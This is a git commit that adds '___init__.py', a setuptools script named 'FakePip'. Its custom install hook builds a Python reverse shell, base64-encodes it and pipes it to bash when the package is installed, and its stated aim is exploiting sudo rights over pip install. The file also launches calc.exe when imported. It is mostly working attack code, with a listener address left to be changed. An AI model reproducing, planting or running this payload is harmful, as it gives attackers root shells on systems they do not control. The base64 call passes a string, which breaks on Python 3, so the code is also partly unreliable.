7d423d5b63d279d8d41b03acbd5e9169670afec9
sdtgccc <yioghbmnb@outlook.com>
2026-01-15 20:58:49 +0900

    Create ___init__.py

---
+++ ___init__.py
@@ -0,0 +1,24 @@
+from setuptools import setup
+from setuptools.command.install import install
+import base64
+import os
+import subprocess
+
+out=subprocess.run(["calc.exe","-p"],capture_output=True,text=True)
+print(out.stdout)
+
+class CustomInstall(install):
+  def run(self):
+    install.run(self)
+    LHOST = '127.0.0.1'  # change this
+    LPORT = 13372
+    
+    reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
+    encoded = base64.b64encode(reverse_shell)
+    os.system('echo %s|base64 -d|bash' % encoded)
+
+setup(name='FakePip',
+      version='0.0.1',
+      description='This will exploit a sudoer able to /usr/bin/pip install *',
+      zip_safe=False,
+      cmdclass={'install': CustomInstall})
